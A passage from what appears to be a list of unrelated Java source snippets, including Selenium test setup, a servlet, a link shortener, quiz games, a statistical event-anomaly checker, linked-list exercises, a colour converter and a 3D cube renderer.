calculator.exponent(3);\n        assertEquals(8, calculator.getResult());\n    }\n}",
    "import org.apache.commons.lang3.time.StopWatch;\r\nimport org.openqa.selenium.JavascriptExecutor;\r\nimport org.openqa.selenium.remote.DesiredCapabilities;\r\nimport org.openqa.selenium.remote.RemoteWebDriver;\r\nimport org.openqa.selenium.remote.SessionId;\r\nimport org.testng.annotations.AfterClass;\r\nimport org.testng.annotations.BeforeClass;\r\n\r\nimport java.net.MalformedURLException;\r\nimport java.net.URL;\r\nimport java.util.ArrayList;\r\n\r\nclass Parent {\r\n\r\n    public String username = System.getenv(\"LT_USERNAME\");\r\n    public String accesskey = System.getenv(\"LT_ACCESS_KEY\");\r\n    public RemoteWebDriver driver;\r\n    public String gridURL = \"mobile-hub.lambdatest.com\";\r\n    String status;\r\n    String hub;\r\n    SessionId sessionId;\r\n\r\n    @org.testng.annotations.Parameters(value = {\"browser\", \"platformVersion\", \"platform\", \"deviceName\"})\r\n    @BeforeClass\r\n    public void setUp(String browser, String platformVersion, String platform, String deviceName) throws Exception {\r\n        try {\r\n\r\n            DesiredCapabilities capabilities = new DesiredCapabilities();\r\n            capabilities.setCapability(\"name\", \"Mobile\");\r\n            capabilities.setCapability(\"build\", \"MobileDemo\");\r\n            capabilities.setCapability(\"deviceName\", deviceName);\r\n//            capabilities.setCapability(\"udid\", \"RZCX101S1DE\");\r\n            capabilities.setCapability(\"platformVersion\",platformVersion );\r\n            capabilities.setCapability(\"platform\", platform);\r\n            capabilities.setCapability(\"network\", true);\r\n            capabilities.setCapability(\"autoGrantPermissions\", true);\r\n            capabilities.setCapability(\"autoAcceptAlerts\", true);\r\n            capabilities.setCapability(\"timezone\", \"UTC+13:00\");\r\n//            capabilities.setCapability(\"app\", \"lt://APP1016020161711527430715639\");\r\n            capabilities.setCapability(\"isRealMobile\", true);\r\n            capabilities.setCapability(\"console\", true);\r\n            capabilities.setCapability(\"visual\", true);\r\n\r\n            StopWatch driverStart = new StopWatch();\r\n            driverStart.start();\r\n\r\n            hub = \"https://\" + username + \":\" + accesskey + \"@\" + gridURL + \"/wd/hub\";\r\n            driver = new RemoteWebDriver(new URL(hub), capabilities);\r\n            System.out.println(\"driver created\");\r\n\r\n            sessionId = driver.getSessionId();\r\n            System.out.println(sessionId);\r\n            driverStart.stop();\r\n            float timeElapsed = driverStart.getTime() / 1000f;\r\n            System.out.println(\"Driver initiate time\" + \"   \" + timeElapsed);\r\n            ArrayList<Float> TotalTimeDriverSetup = new ArrayList<Float>();\r\n            TotalTimeDriverSetup.add(timeElapsed);\r\n            System.out.println(TotalTimeDriverSetup);\r\n\r\n        } catch (\r\n                MalformedURLException e) {\r\n            System.out.println(\"Invalid grid URL\");\r\n        } catch (Exception f) {\r\n            System.out.println(f);\r\n\r\n        }\r\n\r\n    }\r\n\r\n    @AfterClass\r\n    public void tearDown() throws Exception {\r\n        if (driver != null) {\r\n            ((JavascriptExecutor) driver).executeScript(\"lambda-status=\" + status);\r\n            driver.quit();\r\n        }\r\n    }\r\n}\r\n",
    "package com.servlet;\n\nimport java.io.IOException;\nimport java.nio.file.Path;\n\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.MultipartConfig;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\nimport com.conn.DBConnect;\nimport com.dao.DAO;\nimport com.dao.DAO;\n\n\n\n\n@MultipartConfig\n@WebServlet(\"/addproduct\")\npublic class addproduct extends HttpServlet {\n\tprivate static final long serialVersionUID = 1L;\n       \n  \n    public addproduct() {\n        super();\n     \n    }\n\n\tprotected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n\t\t\t}\n\n\tprotected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n\t\t\n\t\t\n\t\t\n\t\ttry{\n\t\t\tDAO dao =new DAO(DBConnect.getConn());\n\t\t\t\n\t\t\t\n\t\t \tif(dao.addproduct(request) > 0)\n\t\t\t{\n\t\t\t\t\n\t\t\t\tresponse.sendRedirect(\"passc.jsp\");\n\t\t\t\t\n\t\t\t\t\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\n\t\t\t\tresponse.sendRedirect(\"failc.jsp\");\n\t\t\t\n\t\t\t}\n\t\t\t\n\t\t}catch (Exception ex){\n\t\t\tSystem.out.println(ex);\n\t\t}\n\n\t\n\t\t\t\n\t\n\t\t\t\t\n\t\t\t\n\t\t\t\n\t\t\n\t\t\n\t}\n\n}\n",
    "package Day2;\n\npublic class Cleaners extends Person{\n    boolean isActive;\n    int cleaningDays;\n    boolean isFluentInEnglish;\n    double yearsOfExperience;\n    boolean isFemale;\n    public Cleaners(){}\n\n    public Cleaners(boolean isActive, int cleaningDays, boolean isFluentInEnglish, double yearsOfExperience, boolean isFemale) {\n        this.isActive = isActive;\n        this.cleaningDays = cleaningDays;\n        this.isFluentInEnglish = isFluentInEnglish;\n        this.yearsOfExperience = yearsOfExperience;\n        this.isFemale = isFemale;\n    }\n\n    public boolean isActive() {\n        return isActive;\n    }\n\n    public void setActive(boolean active) {\n        isActive = active;\n    }\n\n    public int getCleaningDays() {\n        return cleaningDays;\n    }\n\n    public void setCleaningDays(int cleaningDays) {\n        this.cleaningDays = cleaningDays;\n    }\n\n    public boolean isFluentInEnglish() {\n        return isFluentInEnglish;\n    }\n\n    public void setFluentInEnglish(boolean fluentInEnglish) {\n        isFluentInEnglish = fluentInEnglish;\n    }\n\n    public double getYearsOfExperience() {\n        return yearsOfExperience;\n    }\n\n    public void setYearsOfExperience(double yearsOfExperience) {\n        this.yearsOfExperience = yearsOfExperience;\n    }\n\n    public boolean isFemale() {\n        return isFemale;\n    }\n\n    public void setFemale(boolean female) {\n        isFemale = female;\n    }\n}\n",
    "import java.io.*;\r\nimport java.util.HashMap;\r\nimport java.util.Map;\r\n\r\npublic class LinkShortener {\r\n    private Map<String, String> urlMap;\r\n    private int counter;\r\n    private static final String FILENAME = \"url_mappings.txt\";\r\n\r\n    public LinkShortener() {\r\n        this.urlMap = new HashMap<>();\r\n        this.counter = 0;\r\n        loadUrlMappingsFromFile();\r\n    }\r\n\r\n    public String shorten(String longUrl) {\r\n        String shortUrl = \"http://short.url/\" + counter++;\r\n        urlMap.put(shortUrl, longUrl);\r\n        saveUrlMappingsToFile();\r\n        return shortUrl;\r\n    }\r\n\r\n    public String expand(String shortUrl) {\r\n        return urlMap.get(shortUrl);\r\n    }\r\n\r\n    private void saveUrlMappingsToFile() {\r\n        try (PrintWriter writer = new PrintWriter(new FileWriter(FILENAME))) {\r\n            for (Map.Entry<String, String> entry : urlMap.entrySet()) {\r\n                writer.println(entry.getKey() + \",\" + entry.getValue());\r\n            }\r\n        } catch (IOException e) {\r\n            e.printStackTrace();\r\n        }\r\n    }\r\n\r\n    private void loadUrlMappingsFromFile() {\r\n        try (BufferedReader reader = new BufferedReader(new FileReader(FILENAME))) {\r\n            String line;\r\n            while ((line = reader.readLine()) != null) {\r\n                String[] parts = line.split(\",\");\r\n                if (parts.length == 2) {\r\n                    urlMap.put(parts[0], parts[1]);\r\n                }\r\n            }\r\n        } catch (IOException e) {\r\n            // File doesn't exist or other IO error, ignore\r\n        }\r\n    }\r\n}\r\n",
    "import java.util.ArrayList;\nimport java.util.Objects;\nimport java.util.Random;\nimport java.util.Scanner;\n\npublic class Main {\n    private static int rightAnswers;\n\n    private static int questionlength = 1;\n\n    public static void main(String[] args) {\n        boolean keepPlaying = true;\n        Scanner scanner = new Scanner(System.in);\n\n\n        //math question and answers\n        ArrayList<String> mathQuestions = new ArrayList<>();\n        mathQuestions.add(\"Whats 50 + 12?\");\n        mathQuestions.add(\"Whats 2 x 7?\");\n        mathQuestions.add(\"Whats 43 - 4?\");\n        mathQuestions.add(\"Whats 20 / 2?\");\n\n        ArrayList<String> mathAnswers = new ArrayList<>();\n        mathAnswers.add(\"62\");\n        mathAnswers.add(\"14\");\n        mathAnswers.add(\"39\");\n        mathAnswers.add(\"10\");\n\n        //geography question and answers\n        ArrayList<String> geoQuestions = new ArrayList<>();\n        geoQuestions.add(\"What is the capital of France?\");\n        geoQuestions.add(\"What city has the largest population in New Zealand?\");\n        geoQuestions.add(\"What does UK stand for?\");\n        geoQuestions.add(\"What country has the biggest population?\");\n\n        ArrayList<String> geoAnswers = new ArrayList<>();\n        geoAnswers.add(\"PARIS\");\n        geoAnswers.add(\"AUCKLAND\");\n        geoAnswers.add(\"UNITED KINGDOM\");\n        geoAnswers.add(\"CHINA\");\n\n        //english questions and answers\n        ArrayList<String> engQuestions = new ArrayList<>();\n        engQuestions.add(\"Who wrote Hamlet?\");\n        engQuestions.add(\"What word is used to identify people, places, or things?\");\n        engQuestions.add(\"How many letters are in the alphabet?\");\n        engQuestions.add(\"What figure of speech involves comparing things using the words 'like' or 'as'?\");\n\n        ArrayList<String> engAnswers = new ArrayList<>();\n        engAnswers.add(\"SHAKESPEARE\");\n        engAnswers.add(\"NOUN\");\n        engAnswers.add(\"26\");\n        engAnswers.add(\"SIMILE\");\n\n\n        //Introduction\n        System.out.println(\"Welcome to the TEST. We will need you to answer the questions provided.\\nBut first, what is your name?\");\n        //gets the user's name and saves it for later\n        String username = scanner.nextLine();\n        System.out.println(\"Welcome \" + username + \" to the TEST. Please answer the questions provided.\");\n\n        //while loop so that if the user wants they can redo the quiz\n        while (keepPlaying) {\n            rightAnswers = 0;\n            boolean yesOrNo = true;\n            boolean checkSubjectQuestions = true;\n            //asks what set of questions the user would like to do\n            System.out.println(\"What set of question would you like to do?\\nMath[1]\\nEnglish[2]\\nGeography[3]?\");\n\n            //saves the input of the user in a string, this is done as if it was saved as an int it caused issues\n            String whichQuestions = scanner.nextLine();\n\n            //checks what section of questions the user would like to do\n            while (checkSubjectQuestions) {\n                switch (whichQuestions) {\n                    case \"1\" -> {\n                        //math questions\n                        int answers = mathAnswers.size();\n                        answerAllTheQuestionsRandom(mathQuestions, mathAnswers, scanner);\n                        System.out.println(\"You got \" + rightAnswers + \"/\" + answers + \" questions right \" + username + \"!\");\n                        checkSubjectQuestions = false;\n                    }\n                    case \"2\" -> {\n                        //english questions\n                        int answers = engAnswers.size();\n                        answerAllTheQuestionsRandom(engQuestions, engAnswers, scanner);\n                        System.out.println(\"You got \" + rightAnswers + \"/\" + answers + \" questions right \" + username + \"!\");\n                        checkSubjectQuestions = false;\n                    }\n                    case \"3\" -> {\n                        //geography questions\n                        int answers = geoAnswers.size();\n                        answerAllTheQuestionsRandom(geoQuestions, geoAnswers, scanner);\n                        System.out.println(\"You got \" + rightAnswers + \"/\" + answers + \" questions right\" + username + \"!\");\n                        checkSubjectQuestions = false;\n                    }\n                    case null, default -> {\n                        //this occurs if the user specifically did not enter 1,2, or 3\n                        System.out.println(\"That is not a valid answer. Please type 1, 2, or 3.\");\n                        System.out.println(\"What set of question would you like to do?\\nMath[1]\\nEnglish[2]\\nGeography[3]?\");\n                        whichQuestions = scanner.nextLine();\n                    }\n                }\n            }\n            //Asks the user after they finish a section if they would like to quit\n            while (yesOrNo) {\n                questionlength = 1;\n                System.out.println",
    "//package com.company;\nimport java.io.File;\nimport java.io.FileWriter;\nimport java.io.FileReader;\nimport java.io.IOException;\nimport java.util.*;\nimport java.time.LocalDate;\nimport java.time.LocalTime;\nimport java.time.format.DateTimeFormatter;\n\nclass IDS {\n    private static int days;\n    private static String eventFileName;\n    private static String statsFileName;\n\n    //Store event and stats data\n    static ArrayList<Event> eventList = new ArrayList<Event>();\n    static ArrayList<Stats> statList = new ArrayList<Stats>();\n    static ArrayList<Stats> newStatsList = new ArrayList<Stats>();\n\n    //Contains the individual data\n    //individual event value, event total, mean, sd, daily total\n    //{Eventname, {1 of the above}}\n    private static HashMap<String, ArrayList<Double>> individualEventValue;\n    private static HashMap<String, Double> individualEventTotal;\n    private static HashMap<String, Double> individualEventMean;\n    private static HashMap<String, Double> individualEventStandardDeviation;\n    private static HashMap<Integer, Double> dailyTotal;\n\n    //Contains the statistical data for base and live results\n    //{EventName, ArrayList<Double> {Total, Mean, SD}}\n    private static HashMap<String, List<Double>> baseLineResultsMap;\n    private static HashMap<String, List<Double>> liveResultsMap;\n\n    //Holds threshold before calling anomaly\n    //2 * sum of weight\n    private static int threshold;\n\n    private static boolean readEventFile(String fileName){\n\n        String [] temp;\n        String eventName, eventType;\n        double minimum, maximum;\n        int weight;\n        boolean isDiscrete;\n\n        int lineCounter = 0, eventsMonitored = 0;\n\n        try{\n            File file = new File(fileName);\n            Scanner scanner = new Scanner(file);\n\n            System.out.println(\"----------------------------------------------------------------------\");\n            System.out.println(\"Processing \" + fileName);\n            System.out.println(\"----------------------------------------------------------------------\");\n\n            while(scanner.hasNextLine()){\n                if(lineCounter == 0){\n                    eventsMonitored = scanner.nextInt();\n                    scanner.nextLine();\n                    lineCounter++;\n                }else{\n                    //Separate Event name:[CD]:minimum:maximum:weight:\n                    temp = scanner.nextLine().split(\":\");\n                    eventName = temp[0];\n                    eventType = temp[1];\n\n                    isDiscrete = eventType.charAt(0) == 'D';\n\n                    if(isDiscrete){\n                        minimum = Integer.parseInt(temp[2]);\n\n                        if(temp[3].equals(\"\")){\n                            maximum = 999999d;\n                        }else{\n                            maximum = Integer.parseInt(temp[3]);\n                        }\n                    }\n                    else{\n                        minimum = Double.parseDouble(temp[2]);\n\n                        //Check if maximum value is empty\n                        if(temp[3].equals(\"\")){\n                            maximum = 999999f;\n                        }else{\n                            maximum = Double.parseDouble(temp[3]);\n                        }\n                    }\n                    //Check if minimum is more than maximum\n                    if(minimum > maximum){\n                        System.err.println(\"Error. Event \" + eventName + \", minimum value is larger than maximum value.\");\n                        return false;\n                    }\n\n                    //Check if weight is integer and if it is positive value\n                    weight = Integer.parseInt(temp[4]);\n                    threshold += weight;\n                    if(weight < 0){\n                        System.err.println(\"Error. Event \" + eventName + \", weight is not a positive value.\");\n                        return false;\n                    }\n\n                    //add check for duplicate event\n\n\n                    eventList.add(new Event(eventName, isDiscrete, minimum, maximum, weight));\n                    lineCounter++;\n                }\n\n            }\n        }catch (IOException e){\n            e.printStackTrace();\n        }\n\n        //Decrement to remove first line read in\n        lineCounter--;\n\n        //Check if number of event record match number of records it should have\n        if(eventsMonitored != lineCounter && lineCounter > 0){\n            System.out.println(\"Error. Number of events specified does not tally with actual number of event records.\");\n        }\n\n        System.out.println(lineCounter + \" lines successfully read in!\");\n\n        return true;\n\n    }\n\n    private static boolean readStatsFile(String fileName, List<Stats> statList){\n        String [] temp;\n        String eventName;\n        double mean, standardDeviation;\n\n        int lineCounter = 0, eventsMonitored = 0;\n\n        try{\n            File file = new File(fileName);\n         ",
    "package Hospital;\n\npublic abstract class Person {\n\n    private String name;\n    private String id;\n    private String gender;\n    private String stateOfOrigin;\n    private int age;\n\n    public Person() {\n    }\n    public Person(String name, String id, String gender, String stateOfOrigin, int age) {\n        this.name = name;\n        this.id = id;\n        this.gender = gender;\n        this.stateOfOrigin = stateOfOrigin;\n        this.age = age;\n    }\n\n    public String getName() {\n        return name;\n    }\n\n    public void setName(String name) {\n        this.name = name;\n    }\n\n    public String getId() {\n        return id;\n    }\n\n    public void setId(String id) {\n        this.id = id;\n    }\n\n    public String getGender() {\n        return gender;\n    }\n\n    public void setGender(String gender) {\n        this.gender = gender;\n    }\n\n    public String getStateOfOrigin() {\n        return stateOfOrigin;\n    }\n\n    public void setStateOfOrigin(String stateOfOrigin) {\n        this.stateOfOrigin = stateOfOrigin;\n    }\n\n    public int getAge() {\n        return age;\n    }\n\n    public void setAge(int age) {\n        this.age = age;\n    }\n\n    @Override\n    public String toString() {\n        return \"Person{\" +\n                \"name='\" + name + '\\'' +\n                \", id='\" + id + '\\'' +\n                \", gender='\" + gender + '\\'' +\n                \", stateOfOrigin='\" + stateOfOrigin + '\\'' +\n                \", age=\" + age +\n                '}';\n    }\n}",
    "\nimport java.io.*;\n\n\npublic class Main {\n    /**\n     * @param args\n     * @throws Exception\n     */\n    public static void main(String[] args) throws Exception{\n\n        String filePath = \"C:\\\\Users\\\\admin\\\\clone\\\\Groceries.txt\";\n        String fileToWrite = \"F:\\\\test.txt\";\n\n        String [] array = new String[4];\n        String id;\n        String itemName;\n        String quantity;\n        double price;\n        String separator = \",\";\n        double total = 0;\n\n\n        FileReader fileReader = new FileReader(filePath);\n        FileWriter fileWriter = new FileWriter(fileToWrite);\n\n\n        BufferedReader reader = new BufferedReader(fileReader);\n        BufferedWriter writer = new BufferedWriter(fileWriter);\n\n        String line;\n\n        \n\n        while ((line = reader.readLine()) != null) {\n           array = line.split(separator);\n\n           price = Double.parseDouble(array[3]);\n\n           total += price;\n\n           System.out.println(line);\n           writer.write(line );\n           writer.newLine();\n        }\n\n        System.out.println(\"\\n\" + \"Total Price of groceries: \" + Math.round(total));\n        writer.write(\"\\n\" + \"Total price of groceries: \" + Math.round(total));\n\n        reader.close();\n\n        writer.flush();\n        writer.close();\n       \n\n    }\n}",
    "import java.util.Scanner;\n\npublic class Circular_LL {\n    Scanner sc = new Scanner(System.in);\n\n    static class Node{\n        int data;\n        Node next;\n\n        Node(int data)\n        {\n            this.data = data;\n            this.next = null;\n        }\n    }\n    Node head = null;\n    Node tail = null;\n\n    public void Creation()\n    {\n         int data,n;\n    do{\n         System.out.print(\"Enter the data : \");\n         data = sc.nextInt();\n         Node new_node = new Node(data);\n         if(head == null)\n         {\n            head = new_node;\n            tail = new_node;\n            new_node.next =head;\n         }\n         else\n         {\n            \n\n            System.out.print(\"For Insertion at Begin Enter 1 \\nFor Insertion at Middle Enter 2 \\nFor Insertion at End Enter 3 \\nEnter :\");\n            int p = sc.nextInt();\n               switch (p) {\n                case 1:                      //At Begin\n                    new_node.next=head;\n                    head = new_node;\n                    tail.next = head;\n                    break;\n\n                case 2:                              //At Middle\n                    System.out.print(\"Enter the Position Do you want to insert:\");\n                    int a=sc.nextInt();\n                    Node temp = head;\n                    for(int i=0; i<(a-2);i++)\n                    {\n                        temp = temp.next;\n                    }\n                    new_node.next=temp.next;\n                    temp.next=new_node;\n                    break;\n\n                case 3:\n                                                                    \n                    /*while(temp1.next != null)           //at end  \n                    {\n                       temp1=temp1.next;\n                    }*/\n\n                    tail.next = new_node;\n                    tail=new_node;\n                    new_node.next=head;\n                    break;\n                    \n               }\n         }\n         System.out.print(\"Do you want to Enter the Data Again?? if yes then Press 1  :-\");\n         n=sc.nextInt();\n     }while(n==1);\n\n    }\n\n    public void deletion()\n    {\n               \n              if(head == null)\n              {\n                 System.out.println(\"Linked List is empty.\");\n               }\n               else \n               {\n                System.out.print(\"For Deletion at Begin Enter 1 \\nFor Deletion at Middle Enter 2 \\nFor Deletion at End Enter 3 \\nEnter :\");\n                int p = sc.nextInt();\n                switch (p) {\n                    case 1:                      //At Begin\n                        Node temp = head;\n                        temp = temp.next;\n                        head = temp;\n                        tail.next = head;\n                        break;\n    \n                    case 2:                              //At Middle\n                        \n                        System.out.print(\"Enter the Position Do you want to Delete:\");\n                        int a=sc.nextInt();\n                        Node temp1 = head;\n                        Node ptr = temp1.next;\n                        for(int i =0;i<(a-2);i++)\n                        {\n                           temp1=ptr;\n                           ptr=ptr.next;\n                        }\n                        temp1.next=ptr.next;\n                        break; \n    \n                    case 3:\n                        Node temp2 = head;\n                        Node ptr1 = temp2.next;\n                        while(ptr1.next!=head)\n                        {\n                            temp2=ptr1;\n                            ptr1=ptr1.next;\n                        }\n                        temp2.next=head;\n                        tail=temp2;\n                        \n                        break;\n                   }\n               }\n               \n                       \n     }\n    \n    public void traversal(){\n        Node temp=head;\n        if(head == null)\n        {\n            System.out.println(\"LL Does not exist.\");\n        }\n        else{\n\n           do {\n                System.out.print(temp.data+\" \");\n                temp=temp.next;\n            }while(temp!=head);\n            \n        }\n    }\n    public static void main(String args[])\n    {\n        int n1;\n        Circular_LL s =new Circular_LL();\n        Scanner sc1 = new Scanner(System.in);\n      \n        do{\n        System.out.print(\"Enter 1 for Insert.\\nEnter 2 for Delete.\\nEnter 3 for Print.\\nEnter:\");\n        int y=sc1.nextInt();\n        switch(y){\n            case 1:     //For insertion\n                s.Creation();\n                break;\n\n            case 2:\n                s.deletion();\n                 break;\n\n            case 3:\n                  s.traversal();\n                  break;\n\n            }\n            System.out.println(\"\\nIf you want Exit Enter 2.\");\n            n1=sc1.nextInt();\n        }while(n1 != 2);\n       \n    }\n    \n}\n",
    "package DIVISIBILITY;\n\nimport java.util.Scanner;\n\npublic class DIVISIBLILITY {\n\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.print(\"Enter a number: \");\n        int number = scanner.nextInt();\n\n        if (number % (7 * 13) == 0) {\n\n            int quotient7 = number / 7;\n            int remainder7 = number % 7;\n            int quotient13 = number / 13;\n            int remainder13 = number % 13;\n\n            scanner.close();\n\n            System.out.println(number + \" is divisible by both 7 and 13.\");\n            System.out.println(\"Quotient when divided by 7: \" + quotient7);\n            System.out.println(\"Remainder when divided by 7: \" + remainder7);\n            System.out.println(\"Quotient when divided by 13: \" + quotient13);\n            System.out.println(\"Remainder when divided by 13: \" + remainder13);\n\n        } else {\n            System.out.println(number + \" is not divisible by both 7 and 13.\");\n        }\n    }\n}\n",
    "package com.example.CoursePaper2.service;\n\nimport com.example.CoursePaper2.model.Question;\n\nimport java.util.*;\n\npublic class JavaQuestionService implements QuestionService{\n\n    private List<Question> questions = new ArrayList<>(Arrays.asList(\n            new Question(\"\u041a\u0442\u043e \u0432\u043f\u0435\u0440\u0432\u044b\u0435 \u043f\u043e\u0434\u043a\u043e\u0432\u0430\u043b \u0431\u043b\u043e\u0445\u0443?\", \"\u041b\u0435\u0432\u0448\u0430\"),\n            new Question(\"\u0427\u0442\u043e \u0432\u0441\u0435 \u0434\u044b\u0440\u044f\u0432\u043e\u0435, \u043d\u043e \u0434\u0435\u0440\u0436\u0438\u0442 \u0432\u043e\u0434\u0443?\", \"\u0413\u0443\u0431\u043a\u0430\"),\n            new Question(\"\u0427\u0442\u043e \u043c\u043e\u0436\u043d\u043e \u0443\u0441\u043b\u044b\u0448\u0430\u0442\u044c, \u043d\u043e \u043d\u0435\u043b\u044c\u0437\u044f \u0443\u0432\u0438\u0434\u0435\u0442\u044c?\", \"\u041f\u0435\u0441\u043d\u044e\"),\n            new Question(\"\u0420\u044b\u0446\u0430\u0440\u044c \u041f\u0435\u0447\u0430\u043b\u044c\u043d\u043e\u0433\u043e \u041e\u0431\u0440\u0430\u0437\u0430?\", \"\u0414\u043e\u043d \u041a\u0438\u0445\u043e\u0442\"),\n            new Question(\"\u041c\u043e\u0434\u0435\u043b\u044c \u0437\u0435\u043c\u043d\u043e\u0433\u043e \u0448\u0430\u0440\u0430?\", \"\u0413\u043b\u043e\u0431\u0443\u0441\")\n    ));\n    private final Integer numberQuestions = 10;\n\n    public Question add(String question, String answer) {\n        return null;\n    }\n\n    public Question add(Question question) {\n        return null;\n    }\n\n    public Question remove(Question question) {\n        return null;\n    }\n\n    public Collection<Question> getAll() {\n        return null;\n    }\n\n    public Question getRandomQuestion() {\n        return null;\n    }\n\n    public int getRandomQuestion(Integer numberQuestions) {\n        Random numbersRandom = new Random();\n        return numbersRandom.nextInt(numberQuestions) + 1;\n    }\n\n    public static void main(String[] args) {\n        int x = 10;\n        Random y = new Random();\n        int z = y.nextInt(x) + 1;\n        System.out.println(\"z = \" + z);\n    }\n}\n",
    "import java.util.Random;\n\npublic class ColorConverter {\n    public static void main(String[] args) {\n        // \u0413\u0435\u043d\u0435\u0440\u0430\u0446\u0438\u044f \u0441\u043b\u0443\u0447\u0430\u0439\u043d\u043e\u0433\u043e \u0446\u0432\u0435\u0442\u0430 RGB\n\n        int r = 150;\n        int g = 150;\n        int b = 150;\n\n        // \u041f\u0440\u0435\u043e\u0431\u0440\u0430\u0437\u043e\u0432\u0430\u043d\u0438\u0435 RGB \u0432 XYZ\n        double[] xyz = RGBtoXYZ.convert(r, g, b);\n        System.out.println(\"RGB: (\" + r + \", \" + g + \", \" + b + \")\");\n        System.out.println(\"XYZ: (\" + xyz[0] + \", \" + xyz[1] + \", \" + xyz[2] + \")\");\n\n        // \u041f\u0440\u0435\u043e\u0431\u0440\u0430\u0437\u043e\u0432\u0430\u043d\u0438\u0435 XYZ \u043e\u0431\u0440\u0430\u0442\u043d\u043e \u0432 RGB\n        int[] rgb = XYZtoRGB.convert(xyz[0], xyz[1], xyz[2]);\n        System.out.println(\"Converted back to RGB: (\" + rgb[0] + \", \" + rgb[1] + \", \" + rgb[2] + \")\");\n    }\n}\n\nclass RGBtoXYZ {\n    public static double[] convert(int r, int g, int b) {\n        double rr = r / 255.0;\n        double gg = g / 255.0;\n        double bb = b / 255.0;\n\n        // \u041f\u0440\u0435\u043e\u0431\u0440\u0430\u0437\u043e\u0432\u0430\u043d\u0438\u0435 \u0432 \u043b\u0438\u043d\u0435\u0439\u043d\u044b\u0435 \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u044f RGB\n        rr = rr > 0.04045 ? Math.pow((rr + 0.055) / 1.055, 2.4) : rr / 12.92;\n        gg = gg > 0.04045 ? Math.pow((gg + 0.055) / 1.055, 2.4) : gg / 12.92;\n        bb = bb > 0.04045 ? Math.pow((bb + 0.055) / 1.055, 2.4) : bb / 12.92;\n\n        // \u041f\u0440\u0435\u043e\u0431\u0440\u0430\u0437\u043e\u0432\u0430\u043d\u0438\u0435 \u0432 XYZ\n        double x = rr * 0.4124 + gg * 0.3576 + bb * 0.1805;\n        double y = rr * 0.2126 + gg * 0.7152 + bb * 0.0722;\n        double z = rr * 0.0193 + gg * 0.1192 + bb * 0.9505;\n\n        return new double[]{x, y, z};\n    }\n}\n\nclass XYZtoRGB {\n    public static int[] convert(double x, double y, double z) {\n        double rr = x * 3.2406 + y * -1.5372 + z * -0.4986;\n        double gg = x * -0.9689 + y * 1.8758 + z * 0.0415;\n        double bb = x * 0.0557 + y * -0.2040 + z * 1.0570;\n\n        // \u041f\u0440\u0435\u043e\u0431\u0440\u0430\u0437\u043e\u0432\u0430\u043d\u0438\u0435 \u0432 \u043d\u0435\u043b\u0438\u043d\u0435\u0439\u043d\u044b\u0435 \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u044f RGB\n        rr = rr > 0.0031308 ? 1.055 * Math.pow(rr, 1 / 2.4) - 0.055 : 12.92 * rr;\n        gg = gg > 0.0031308 ? 1.055 * Math.pow(gg, 1 / 2.4) - 0.055 : 12.92 * gg;\n        bb = bb > 0.0031308 ? 1.055 * Math.pow(bb, 1 / 2.4) - 0.055 : 12.92 * bb;\n\n        // \u041f\u0440\u0435\u043e\u0431\u0440\u0430\u0437\u043e\u0432\u0430\u043d\u0438\u0435 \u0432 \u0446\u0435\u043b\u043e\u0447\u0438\u0441\u043b\u0435\u043d\u043d\u044b\u0435 \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u044f RGB\n        int r = (int) Math.round(rr * 255);\n        int g = (int) Math.round(gg * 255);\n        int b = (int) Math.round(bb * 255);\n\n        return new int[]{r, g, b};\n    }\n}\n",
    "import javax.swing.*;\r\nimport java.awt.*;\r\n\r\npublic class GameEngine3D extends JPanel {\r\n\r\n    private static final int WIDTH = 800;\r\n    private static final int HEIGHT = 600;\r\n\r\n    private double[][] vertices = {\r\n            { -1, -1, -1 },\r\n            { -1, -1, 1 },\r\n            { -1, 1, -1 },\r\n            { -1, 1, 1 },\r\n            { 1, -1, -1 },\r\n            { 1, -1, 1 },\r\n            { 1, 1, -1 },\r\n            { 1, 1, 1 }\r\n    };\r\n\r\n    private int[][] edges = {\r\n            { 0, 1 }, { 0, 2 }, { 0, 4 }, { 1, 3 }, { 1, 5 }, { 2, 3 }, { 2, 6 }, { 3, 7 }, { 4, 5 }, { 4, 6 },\r\n            { 5, 7 }, { 6, 7 }\r\n    };\r\n\r\n    private double angleX = 0.01;\r\n    private double angleY = 0.01;\r\n\r\n    public GameEngine3D() {\r\n        setPreferredSize(new Dimension(WIDTH, HEIGHT));\r\n        Timer timer = new Timer(10, e -> {\r\n            rotateX(angleX);\r\n            rotateY(angleY);\r\n            repaint();\r\n        });\r\n        timer.start();\r\n    }\r\n\r\n    private void rotateX(double angle) {\r\n        double sinTheta = Math.sin(angle);\r\n        double cosTheta = Math.cos(angle);\r\n        for (double[] vertex : vertices) {\r\n            double y = vertex[1];\r\n            double z = vertex[2];\r\n            vertex[1] = y * cosTheta - z * sinTheta;\r\n            vertex[2] = y * sinTheta + z * cosTheta;\r\n        }\r\n    }\r\n\r\n    private void rotateY(double angle) {\r\n        double sinTheta = Math.sin(angle);\r\n        double cosTheta = Math.cos(angle);\r\n        for (double[] vertex : vertices) {\r\n            double x = vertex[0];\r\n            double z = vertex[2];\r\n            vertex[0] = x * cosTheta - z * sinTheta;\r\n            vertex[2] = x * sinTheta + z * cosTheta;\r\n        }\r\n    }\r\n\r\n    private Point project(double x, double y, double z) {\r\n        double scale = 200;\r\n        double fov = 100;\r\n        double xProjected = x * fov / (z + fov) * scale + WIDTH / 2;\r\n        double yProjected = y * fov / (z + fov) * scale + HEIGHT / 2;\r\n        return new Point((int) xProjected, (int) yProjected);\r\n    }\r\n\r\n    @Override\r\n    protected void paintComponent(Graphics g) {\r\n        super.paintComponent(g);\r\n        g.setColor(Color.BLACK);\r\n        g.fillRect(0, 0, WIDTH, HEIGHT);\r\n\r\n        g.setColor(Color.WHITE);\r\n        for (int[] edge : edges) {\r\n            double[] vertex1 = vertices[edge[0]];\r\n            double[] vertex2 = vertices[edge[1]];\r\n            Point p1 = project(vertex1[0], vertex1[1], vertex1[2]);\r\n            Point p2 = project(vertex2[0], vertex2[1], vertex2[2]);\r\n            g.drawLine(p1.x, p1.y, p2.x, 